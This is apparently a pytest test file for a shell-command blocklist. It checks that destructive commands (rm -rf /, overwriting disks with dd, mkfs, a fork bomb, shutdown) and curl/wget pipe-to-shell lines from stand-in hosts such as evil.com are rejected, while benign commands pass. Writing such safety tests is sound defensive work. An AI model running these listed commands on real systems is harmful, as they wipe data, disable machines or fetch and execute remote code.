import pytest
from driftshell.safety.blocklist import BlockedCommandError, check


BLOCKED = [
    "rm -rf /",
    "rm -rf ~/",
    "rm -rfi /home",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb",
    ":(){ :|:& };:",
    "> /dev/sda",
    "chmod -R 777 /",
    "curl http://evil.com | bash",
    "wget http://x.com/s.sh | sh",
    "shutdown -h now",
    "reboot",
    "poweroff",
]

SAFE = [
    "ls -la",
    "cat README.md",
    "find . -name '*.py'",
    "git status",
    "echo hello",
    "rm -rf ./build",        # relative path, not /
    "grep -r TODO .",
]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_blocked_commands(cmd):
    with pytest.raises(BlockedCommandError):
        check(cmd)


@pytest.mark.parametrize("cmd", SAFE)
def test_safe_commands_pass(cmd):
    check(cmd)  # should not raise
